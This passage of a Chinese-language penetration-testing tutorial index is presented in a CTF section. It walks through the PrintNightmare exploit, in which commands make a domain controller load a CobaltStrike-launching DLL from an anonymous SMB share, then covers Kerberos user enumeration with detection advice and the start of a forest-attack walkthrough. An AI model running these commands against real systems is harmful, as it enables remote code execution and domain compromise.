\u76ee\u5f55\u4e4b\u5916\u7684\u6587\u4ef6\u3002\u5728\u5bf9\u6253\u5370\u673a\u7684\u884c\u4e3a\u76d1\u63a7\u65f6\uff0c\u6211\u4eec\u89c2\u5bdf\u5230\u6bcf\u5f53\u65b0\u7684\u6253\u5370\u673a\u9a71\u52a8\u6587\u4ef6\u88ab\u6dfb\u52a0\u65f6\uff0c\u6253\u5370\u673a\u670d\u52a1\u4f1a\u5bf9\u65b0\u6dfb\u52a0\u7684\u6253\u5370\u673a\u9a71\u52a8\u6587\u4ef6\u8fdb\u884c\u5907\u4efd\uff0c\u5c06\u5176\u62f7\u8d1d\u81f3<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old*</code>\u76ee\u5f55\u4e0b\uff0c<code>*</code>\u4e3a\u4e00\u4e2a\u6570\u5b57\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6539\u8fdb\u4e0a\u8ff0\u7684\u5229\u7528\u6b65\u9aa4\uff0c\u5728\u7b2c\u4e8c\u6b21\u8c03\u7528 RpcAddPrinterDriver \u65f6\uff0c\u6307\u5b9aA \u4e3a<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old*\\Evil.dll</code>\uff0c\u5982\u6b64\u4fbf\u53ef\u4ee5\u5b9e\u73b0\u8fdc\u7a0b\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <p>\u2022 \u57df\u63a7 Server 2019\uff1a10.211.55.14 \u2022 Windows \u533f\u540d\u5171\u4eab\u4e3b\u673a\uff1a10.211.55.7 \u2022 \u57df\u5185\u6709\u6548\u666e\u901a\u57df\u7528\u6237\uff1axie\\hack P@ss1234</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#1_1","title":"1. \u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e","text":"<p>\u4f7f\u7528 rpcdump.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u68c0\u6d4b\u76ee\u6807\u673a\u5668\u662f\u5426\u5f00\u542f MS-RPRN \u670d\u52a1\uff0c\u5b58\u5728\u5373\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\uff1a</p> <pre><code>python3 rpcdump.py @10.211.55.14 | grep MS-RPRN\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u76ee\u6807 10.211.55.14 \u5f00\u542f\u4e86 MS-RPRN \u670d\u52a1\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#2-smb","title":"2.\u521b\u5efa\u533f\u540d SMB \u5171\u4eab","text":"<p>\u63a2\u6d4b\u5230\u76ee\u6807\u5f00\u542f\u4e86 MS-RPRN \u670d\u52a1\u540e\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u540e\u7eed\u7684\u5229\u7528\u4e86\u3002\u9996\u5148\u5f97\u642d\u5efa\u4e00\u4e2a\u533f\u540d\u7684 SMB \u5171\u4eab\uff0c\u5728\u8be5\u533f\u540d\u5171\u4eab\u4e2d\u653e\u5165\u6211\u4eec\u5236\u4f5c\u7684 1.dll \u6076\u610f\u6587\u4ef6\uff0c1.dll \u6076\u610f\u6587\u4ef6\u7684\u529f\u80fd\u662f\u4e0a\u7ebf CobaltStrike\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#1linux","title":"\uff081\uff09Linux \u521b\u5efa\u533f\u540d\u5171\u4eab","text":"<p>Linux \u4e0b\u521b\u5efa\u533f\u540d\u5171\u4eab\u7684\u8bdd\u9700\u8981\u5b89\u88c5 smbd \u670d\u52a1\uff0cKali \u9ed8\u8ba4\u5b89\u88c5\uff0c\u6211\u4eec\u8fd9\u91cc\u4ee5Kali \u4e3a\u4f8b\u3002</p> <p>\u7136\u540e\u4fee\u6539 SMB \u914d\u7f6e\u6587\u4ef6<code>/etc/samba/smb.conf</code>\uff0c\u4fee\u6539\u4e3a\u5982\u4e0b\uff1a</p> <pre><code>[global]\nmap to guest = Bad User\nserver role = standalone server\nusershare allow guests = yes\nidmap config * : backend = tdb\nsmb ports = 445\n\n[smb]\ncomment = Samba\npath = /tmp/\nguest ok = yes\nread only = no\nbrowsable = yes\n</code></pre> <p>\u63a5\u7740\u5c06 1.dll \u6076\u610f\u6587\u4ef6\u653e\u5728 tmp \u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8 SMB \u670d\u52a1\u3002</p> <pre><code>#\u542f\u52a8 smb \u670d\u52a1\nservice smbd start\n\n#\u67e5\u770b smb \u670d\u52a1\u72b6\u6001\nservice smbd status\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u6210\u529f\u542f\u52a8 SMB \u670d\u52a1\u3002SMB \u670d\u52a1\u542f\u52a8\u540e\uff0c\u5171\u4eab\u8def\u5f84\u4e3a\uff1a<code>\\Linux \u673a\u5668 ip\\smb\\1.dll</code></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#2windows","title":"\uff082\uff09Windows \u521b\u5efa\u533f\u540d\u5171\u4eab","text":"<p>\u63a5\u4e0b\u6765\u6f14\u793a\u5728 Windows \u73af\u5883\u4e0b\u521b\u5efa\u533f\u540d\u5171\u4eab\u3002\u5728 Windows \u673a\u5668 10.211.55.7\u4e0a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c cmd\uff0c\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u3002\u8be5\u547d\u4ee4\u4f1a\u5728 C \u76d8\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3ashare \u7684\u5171\u4eab\u6587\u4ef6\u5939\u3002</p> <pre><code>mkdir C:\\share\n</code></pre> <p>\u63a5\u7740\uff0c\u5f80\u521a\u521a\u521b\u5efa\u7684 share \u76ee\u5f55\u4e0b\u653e\u5165\u6076\u610f\u7684 1.dll \u6587\u4ef6\uff0c\u518d\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u3002\u8fd9\u4e9b\u547d\u4ee4\u4f1a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a share \u7684\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u5171\u4eab\u8def\u5f84\u662f C:\\share\uff0c\u5e76\u4e14\u5141\u8bb8\u5176\u533f\u540d\u767b\u5f55\u3002</p> <p>\u6ce8\uff1a\u5207\u8bb0\u5207\u8bb0\uff01\uff01\u987a\u5e8f\u4e0d\u80fd\u9519\uff0c\u4e00\u5b9a\u662f\u5148\u5c06 1.dll \u4f20\u5165 C:\\share \u76ee\u5f55\u4e4b\u540e\uff0c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u3002</p> <pre><code>icacls C:\\share\\ /T /grant \"ANONYMOUS LOGON\":r\nicacls C:\\share\\ /T /grant Everyone:r\npowershell.exe New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'\nREG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f\nREG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f\nREG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f\nREG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t\nREG_DWORD /d 0 /f\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u6210\u529f\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a share \u7684\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u5171\u4eab\u8def\u5f84\u662f C:\\share\uff0c\u5e76\u4e14\u5141\u8bb8\u5176\u533f\u540d\u767b\u5f55\u3002</p> <p></p> <p>\u4f46\u662f\u6709\u4e9b\u673a\u5668\uff0c\u5982 Win7\u3001Server2008 \u7b49\u6267\u884c\u5982\u4e0b powershell \u8bed\u53e5\u4f1a\u62a5\u9519\u3002</p> <pre><code>powershell.exe New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone\n</code></pre> <p>\u5bf9\u4e8e\u6267\u884c powershell \u8bed\u53e5\u62a5\u9519\u7684\u673a\u5668\uff0c\u5219\u9700\u8981 RDP \u767b\u5f55\u5230\u76ee\u6807\u673a\u5668\uff0c\u6267\u884c\u5982\u4e0b\u4e00\u4e9b\u64cd\u4f5c\u3002</p> <p>\u627e\u5230 C:\\share \u76ee\u5f55\uff0c\u53f3\u952e\u2014&gt;\u5c5e\u6027\uff0c\u627e\u5230\u5171\u4eab\u6846\uff0c\u7136\u540e\u5c06 Everyone \u6dfb\u52a0\u8fdb\u53bb\uff0c\u70b9\u51fb\u5171\u4eab\u5373\u53ef\uff1a</p> <p></p> <p>\u6ce8\uff1a\u521b\u5efa\u533f\u540d\u5171\u4eab\u7684 Windows \u670d\u52a1\u5668\u4e0d\u9700\u8981\u5728\u57df\u5185\uff0c\u4f46\u662f\u8be5\u673a\u5668\u7684\u9632\u706b\u5899\u9700\u5f00\u653e 445 \u7aef\u53e3\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#3","title":"3.\u6f0f\u6d1e\u5229\u7528","text":"<p>\u521b\u5efa\u5b8c\u533f\u540d\u5171\u4eab\u540e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u4e86\u3002\u5982\u4e0b\u6f14\u793a\u4f7f\u7528 python \u811a\u672c\u548cmimikatz \u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u533f\u540d\u5171\u4eab\u7684\u8def\u5f84\u662f\\10.211.55.7\\share\\1.dll\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#1-python","title":"\uff081\uff09\u4f7f\u7528 python \u811a\u672c\u653b\u51fb","text":"<p>\u4f7f\u7528 CVE-2021-1675.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u6f0f\u6d1e\u5229\u7528\u5b8c\u6210\u540e\u4f1a\u5c06\u6211\u4eec\u7684\u6076\u610f dll \u6587\u4ef6\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u5668\u7684<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3</code>\u76ee\u5f55\u4e0b\u5e76\u6267\u884c\u3002</p> <pre><code>python3 CVE-2021-1675.py xie.com/test:P@ss1234@10.211.55.14 '\\\\10.211.55.7\\share\\1.dll'\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6f0f\u6d1e\u5229\u7528\u5b8c\u6210\u540e\uff0c\u5373\u53ef\u770b\u5230\u76ee\u6807\u673a\u5668 10.211.55.14 \u4e0a\u7ebf\uff0c\u5e76\u4e14\u4e0a\u7ebf\u7684\u8fdb\u7a0b\u662f spoolsv.exe \u6253\u5370\u673a\u670d\u52a1\u7684\u8fdb\u7a0b\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#2-mimikatz","title":"\uff082\uff09\u4f7f\u7528 mimikatz \u653b\u51fb","text":"<p>\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u6f0f\u6d1e\u5229\u7528\u5b8c\u6210\u540e\u4f1a\u5c06\u6211\u4eec\u7684\u6076\u610fdll \u6587\u4ef6\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u5668\u7684 <code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2</code>\u76ee\u5f55\u4e0b\u5e76\u6267\u884c\u3002</p> <pre><code>mimikatz.exe \"misc::printnightmare /server:10.211.55.14 /library:\\\\10.211.55.7\\share\\1.dll\"\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/index.html","title":"\u57df\u5185\u6e17\u900f\u624b\u6cd5","text":"<p>\u4ecb\u7ecd\u4e86\u57df\u6e17\u900f\u8fc7\u7a0b\u4e2d\u5e38\u89c1\u7684\u6e17\u900f\u624b\u6cd5\u3002</p> <ul> <li>\u57df\u5185\u7528\u6237\u540d\u679a\u4e3e</li> <li>\u57df\u5185\u5bc6\u7801\u55b7\u6d12</li> <li>AS-REP Roasting \u653b\u51fb</li> <li>Kerberoasting \u653b\u51fb</li> <li>\u59d4\u6d3e\u653b\u51fb</li> <li>NTLM Relay \u653b\u51fb</li> <li>\u4fee\u6539 DCSync ACL \u653b\u51fb</li> <li>PTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb</li> <li>\u5b9a\u4f4d\u7528\u6237\u767b\u5f55\u7684\u4e3b\u673a</li> <li>\u57df\u6797\u653b\u51fb</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html","title":"\u57df\u5185\u7528\u6237\u540d\u679a\u4e3e","text":"<p>\u57df\u5185\u7528\u6237\u540d\u679a\u4e3e\u53ef\u4ee5\u5728\u65e0\u57df\u5185\u6709\u6548\u51ed\u636e\u7684\u60c5\u51b5\u4e0b\uff0c\u679a\u4e3e\u51fa\u57df\u5185\u5b58\u5728\u7684\u7528\u6237\u540d\uff0c\u8fdb\u800c\u5bf9\u57df\u5185\u5b58\u5728\u7684\u7528\u6237\u540d\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\uff0c\u4ee5\u6b64\u6765\u83b7\u5f97\u57df\u5185\u6709\u6548\u51ed\u636e\u3002</p> <p>\u5728 Kerberos \u534f\u8bae\u8ba4\u8bc1\u7684<code>AS-REQ</code> \u9636\u6bb5\uff0c\u8bf7\u6c42\u5305 cname \u5bf9\u5e94\u7684\u503c\u662f\u7528\u6237\u540d\u3002\u5f53\u7528\u6237\u540d\u5b58\u5728\u3001\u7528\u6237\u5b58\u5728\u4f46\u7981\u7528\u3001\u7528\u6237\u4e0d\u5b58\u5728\u65f6\uff0c<code>AS-REP</code> \u8fd4\u56de\u5305\u72b6\u6001\u4e0d\u540c\u3002\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u8fd9\u70b9\uff0c\u5bf9\u76ee\u6807\u57df\u8fdb\u884c\u57df\u7528\u6237\u679a\u4e3e\u3002</p> AS-REP \u56de\u590d\u5305\u72b6\u6001 Kerberos \u9519\u8bef\u4fe1\u606f \u7528\u6237\u5b58\u5728 \u4e14\u542f\u7528 KDC_ERR_PREAUTH_REQUIRED (\u9700\u8981\u989d\u5916\u7684\u9884\u8ba4\u8bc1) \u7528\u6237\u5b58\u5728 \u4f46\u7981\u7528 KDC_ERR_CLIENT_REVOKED NT Status\uff1a STATUS_ACCOUNT_DISABLED (\u7528\u6237\u72b6\u6001\u4e0d\u53ef\u7528) \u7528\u6237\u4e0d\u5b58\u5728 KDC_ERR_C_PRINCIPAL_UNKNOWN (\u627e\u4e0d\u5230\u6b64\u7528\u6237)"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html#_2","title":"\u57df\u5185\u7528\u6237\u540d\u679a\u4e3e\u5de5\u5177","text":"<p>\u56e0\u6b64\uff0c\u5f53\u653b\u51fb\u8005\u4e0d\u5728\u57df\u5185\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u5185\u7528\u6237\u679a\u4e3e\u6765\u679a\u4e3e\u51fa\u57df\u5185\u5b58\u5728\u7684\u7528\u6237\u3002\u4ee5\u4e0b\u6f14\u793a\u4f7f\u7528\u5982\u4e0b\u51e0\u6b3e\u5de5\u5177\u8fdb\u884c\u57df\u5185\u7528\u6237\u679a\u4e3e\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html#1kerbrute","title":"1.Kerbrute","text":"<p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/ropnop/kerbrute</p> <p>\u4e00\u6b3e\u4f7f\u7528 go \u8bed\u8a00\u5199\u7684\u57df\u7528\u6237\u679a\u4e3e\u548c\u5bc6\u7801\u55b7\u6d12\u5de5\u5177\uff0c\u8be5\u5de5\u5177\u57df\u7528\u6237\u679a\u4e3e\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>./kerbrute_darwin_amd64 userenum --dc 10.211.55.4 -d xie.com user.txt\n</code></pre> <p>\u53c2\u6570\u542b\u4e49\u5982\u4e0b\uff1a</p> <p>\u2022 userenum\uff1a\u7528\u6237\u679a\u4e3e\u6a21\u5f0f \u2022 --dc\uff1a\u6307\u5b9a\u57df\u63a7 ip \u2022 -d\uff1a\u6307\u5b9a\u57df\u540d \u2022 user.txt\uff1a\u7528\u6237\u540d\u5b57\u5178\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5b57\u5178\u53ef\u4e0d\u52a0\u57df\u540d\u540e\u7f00</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 kerbrute \u5de5\u5177\u8fdb\u884c\u7528\u6237\u540d\u679a\u4e3e\uff0c\u6307\u5b9a\u7684\u57df\u63a7 ip \u4e3a10.211.55.4\uff0c\u6307\u5b9a\u7684\u57df\u540d\u4e3a xie.com\uff0c\u679a\u4e3e\u7684\u7528\u6237\u540d\u5b57\u5178\u4e3a user.txt \u6587\u4ef6\u3002\u53ef\u4ee5\u770b\u5230\u679a\u4e3e\u51fa\u6709\u6548\u57df\u7528\u6237\u540d administrator\u3001hack \u548c test\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html#2pykerbrute","title":"2.pyKerbrute","text":"<p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/3gstudent/pyKerbrute</p> <p>\u4e00\u6b3e\u4f7f\u7528 python \u5199\u7684\u57df\u7528\u6237\u679a\u4e3e\u548c\u5bc6\u7801\u55b7\u6d12\u811a\u672c\u3002\u5176\u53ef\u4ee5\u901a\u8fc7 tcp \u548c udp\u4e24\u79cd\u6a21\u5f0f\u8fdb\u884c\u5de5\u4f5c\uff0cuser.txt \u7528\u6237\u540d\u6587\u4ef6\u683c\u5f0f\u4e0d\u9700\u8981\u52a0\u540e\u7f00\u683c\u5f0f\u3002\u8be5\u5de5\u5177\u57df\u7528\u6237\u679a\u4e3e\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#tcp \u6a21\u5f0f\npython2 EnumADUser.py 10.211.55.4 xie.com user.txt tcp\n#udp \u6a21\u5f0f\npython2 EnumADUser.py 10.211.55.4 xie.com user.txt udp\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5229\u7528 pyKerbrute \u5de5\u5177\u4ee5 TCP/UDP \u4e24\u79cd\u6a21\u5f0f\u8fdb\u884c\u57df\u7528\u6237\u540d\u679a\u4e3e\uff0c\u53ef\u4ee5\u770b\u5230\u679a\u4e3e\u51fa\u6709\u6548\u57df\u7528\u6237\u540d administrator \u548c hack\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html#3msf","title":"3.MSF \u6a21\u5757","text":"<p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 MSF \u4e0b\u7684 auxiliary/gather/kerberos_enumusers \u6a21\u5757\u8fdb\u884c\u57df\u7528\u6237\u679a\u4e3e\uff0c\u4f7f\u7528\u547d\u4ee4\u5982\u4e0b\u3002</p> <pre><code>use auxiliary/gather/kerberos_enumusers\nset domain xie.com\nset rhosts 10.211.55.4\nset user_file /opt/user.txt\nrun\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 MSF \u4e0b\u7684 <code>auxiliary/gather/kerberos_enumusers</code> \u6a21\u5757\u8fdb\u884c\u57df\u7528\u6237\u679a\u4e3e\uff0c\u53ef\u4ee5\u770b\u5230\u679a\u4e3e\u51fa\u6709\u6548\u57df\u7528\u6237\u540d test\u3001administrator\u3001hack\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html#_3","title":"\u57df\u7528\u6237\u679a\u4e3e\u6293\u5305\u5206\u6790","text":"<p>\u5728\u7528\u6237\u540d\u5b57\u5178\u91cc\u653e\u5165\u4e86 3 \u4e2a\u7528\u6237\u540d\u8fdb\u884c\u7528\u6237\u540d\u679a\u4e3e\u3002\u5176\u4e2d administrator \u662f\u5b58\u5728\u7684\u7528\u6237\u540d\uff0chack \u662f\u5b58\u5728\u4f46\u88ab\u7981\u7528\u7684\u7528\u6237\u540d\uff0cwangwei \u662f\u4e0d\u5b58\u5728\u7684\u7528\u6237\u540d\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u4ece hack \u7684\u5c5e\u6027\u53ef\u4ee5\u770b\u51fa hack \u7528\u6237\u88ab\u7981\u7528\u4e86\u3002</p> <p></p> <p>WireShark \u6293\u5305\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6709 6 \u4e2a\u4e0e Kerberos \u76f8\u5173\u7684\u5305\uff0c\u5747\u662f AS\u76f8\u5173\u7684\u5305\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u524d\u4e24\u4e2a\u5305\u662f administrator \u7528\u6237\u7684\u679a\u4e3e\uff0c\u4ece AS-REP \u8fd4\u56de\u5305\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u72b6\u6001\u4e3a<code>KDC_ERR_PREAUTH_REQUIRED</code></p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u4e2d\u95f4\u4e24\u4e2a\u5305\u662f hack \u7528\u6237\u7684\u679a\u4e3e\uff0c\u4ece AS-REP \u8fd4\u56de\u5305\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u72b6\u6001\u4e3a <code>KDC_ERR_CLIENT_REVOKED NT Status\uff1aSTATUS_ACCOUNT_DISABLED</code></p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6700\u540e\u4e24\u4e2a\u5305\u662f\u7528\u6237 wangwei \u7684\u679a\u4e3e\uff0c\u4ece AS-REP \u8fd4\u56de\u5305\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u72b6\u6001\u4e3a<code>KDC_ERR_C_PRINCIPAL_UNKNNOWN</code></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html#_4","title":"\u57df\u7528\u6237\u679a\u4e3e\u653b\u51fb\u9632\u5fa1","text":"<p>\u5bf9\u4e8e\u9632\u5b88\u65b9\u6216\u84dd\u961f\u6765\u8bf4\uff0c\u5982\u4f55\u9488\u5bf9\u57df\u7528\u6237\u679a\u4e3e\u653b\u51fb\u8fdb\u884c\u68c0\u6d4b\u548c\u9632\u5fa1\u5462\uff1f</p> <p>\u7531\u4e8e\u57df\u7528\u6237\u679a\u4e3e\u662f\u901a\u8fc7\u53d1\u9001\u5927\u91cf\u7684<code>AS-REQ</code> \u8bf7\u6c42\u5305\uff0c\u6839\u636e\u8fd4\u56de\u5305\u7684\u5185\u5bb9\u7b5b\u9009\u51fa\u5b58\u5728\u7684\u57df\u7528\u6237\u3002\u56e0\u6b64\u53ef\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff1a</p> <ul> <li>\u6d41\u91cf\u5c42\u9762\u7684\u8bdd\uff0c\u53ef\u901a\u8fc7\u68c0\u6d4b\u540c\u4e00 IP \u5728\u77ed\u65f6\u95f4\u5185\u662f\u5426\u53d1\u9001\u4e86\u5927\u91cf\u7684AS-REQ \u8bf7\u6c42\u5305\u6765\u5224\u65ad\u3002\u5982\u679c\u540c\u4e00 IP \u5728\u77ed\u65f6\u95f4\u5185\u53d1\u9001\u7684\u5927\u91cf\u7684 AS-REQ\u8bf7\u6c42\u5305(\u5982 1 \u5206\u949f&gt;30 AS-REQ \u5305)\uff0c\u5219\u53ef\u5224\u65ad\u4e3a\u5f02\u5e38\u3002</li> <li>\u800c\u65e5\u5fd7\u5c42\u9762\u7684\u8bdd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u57df\u7528\u6237\u679a\u4e3e\u5e76\u4e0d\u4f1a\u5bf9\u4e0d\u5b58\u5728\u7684\u7528\u6237\u540d\u53d1\u8d77\u7684 AS-REQ \u8bf7\u6c42\u5305\u4ea7\u751f\u4efb\u4f55\u4e8b\u4ef6\u65e5\u5fd7\uff0c\u56e0\u6b64\u65e5\u5fd7\u5c42\u9762\u4e0d\u592a\u597d\u68c0\u6d4b\u3002</li> </ul> <p>\u6ce8\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b Windows \u7cfb\u7edf\u7684\u65e5\u5fd7\u5e76\u4e0d\u4f1a\u8bb0\u5f55\u5bf9\u4e0d\u5b58\u5728\u7684\u7528\u6237\u540d\u53d1\u8d77\u7684AS-REQ \u8bf7\u6c42\u5305\u7684\u65e5\u5fd7\u3002\u5982\u679c\u60f3\u5f00\u542f\u6b64\u8bb0\u5f55\uff0c\u9700\u8981\u53bb\u7ec4\u7b56\u7565\u4e2d\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\u548c\u9ad8\u7ea7\u5ba1\u6838\u7b56\u7565\u3002\u5e76\u4e14\u65e5\u5fd7\u7684\u8bb0\u5f55\u8fd8\u548c\u901a\u4fe1\u7684 KDC \u6709\u5173\uff0c\u5982\u679c\u57df\u4e2d\u5b58\u5728\u591a\u4e2a\u57df\u63a7\uff0c\u5219\u4e0d\u540c\u57df\u63a7\u4e0a\u8bb0\u5f55\u7684\u65e5\u5fd7\u5e76\u4e0d\u76f8\u540c\uff0c\u5e76\u4e0d\u662f\u6bcf\u4e2a KDC \u4e0a\u90fd\u4f1a\u8bb0\u5f55\u6240\u6709\u7684\u65e5\u5fd7\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html","title":"\u57df\u6797\u653b\u51fb","text":"<p>\u5982\u679c\u78b0\u5230\u4e86\u76ee\u6807\u662f\u57df\u6797\u7684\u67b6\u6784\uff0c\u5728\u62ff\u4e0b\u4e86\u57df\u6797\u4e2d\u67d0\u4e2a\u5b50\u57df\u7684\u63a7\u5236\u6743\u9650\u540e\uff0c\u5982\u4f55\u901a\u8fc7\u5b50\u57df\u6a2a\u5411\u5230\u6797\u6839\u57df\u8fdb\u800c\u63a7\u5236\u6574\u4e2a\u57df\u6797\u5462\uff1f\u672c\u6587\u4e3b\u8981\u8bb2\u89e3\u57df\u6797\u4e2d\u6a2a\u5411\u6e17\u900f\u7684\u4e00\u4e9b\u624b\u6cd5\u548c\u653b\u51fb\u601d\u8def\u3002</p> <p>\u6709\u5982\u4e0b\u5b9e\u9a8c\u73af\u5883\uff1a</p> <p>xie.com \u662f\u57df\u6797\u7684\u6797\u6839\u57df\uff0cshanghai.xie.com \u548c beijing.xie.com \u90fd\u662fxie.com \u7684\u5b50\u57df\u3002shanghai.xie.com \u57df\u4e2d\u6709\u4e00\u4e2a\u57df\u5185\u4e3b\u673a Win2008R2\uff0cbeijing.xie.com \u57df\u4e2d\u6709\u4e00\u4e2a\u57df\u5185\u4e3b\u673a Win10\u3002\u6574\u4f53\u67b6\u6784\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u73b0\u5728\u901a\u8fc7\u5176\u4ed6\u624b\u6bb5\u62ff\u4e0b\u4e86\u4e3b\u673a Win2008R2 \u7684\u6743\u9650\uff0c\u5e76\u4e14\u901a\u8fc7\u6267\u884c\u76f8\u5173\u547d\u4ee4\u5f97\u77e5\u5f53\u524d\u4e3b\u673a Win2008R2 \u5728 shanghai.xie.com \u57df\u5185\u3002\u901a\u8fc7\u67e5\u8be2\u57df\u4fe1\u4efb\u5173\u7cfb\u53ef\u4ee5\u5f97\u77e5\u5f53\u524d\u57df\u6797\u4e2d\u6709\u4e09\u4e2a\u57df\u3002\u6797\u6839\u57df\u4e3a xie.com\uff0c\u4e24\u4e2a\u5b50\u57df\u4e3a beijing.xie.com \u548cshanghai.xie.com\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 CobaltStrike \u6267\u884c\u76f8\u5173\u67e5\u8be2\u547d\u4ee4\uff1a</p> <p></p> <p>\u901a\u8fc7 CobaltStrike \u5185\u7f6e\u7684 mimikatz \u6a21\u5757\u6293\u53d6\u5230\u5f53\u524d\u673a\u5668\u7528\u6237\u7684\u51ed\u636e\u3002\u7528\u6237\u4e3a\u57df shanghai.xie.com \u4e0b\u7684 sh_test\uff0c\u5bc6\u7801\u4e3a\uff1aP@ss1234\u3002</p> <p></p> 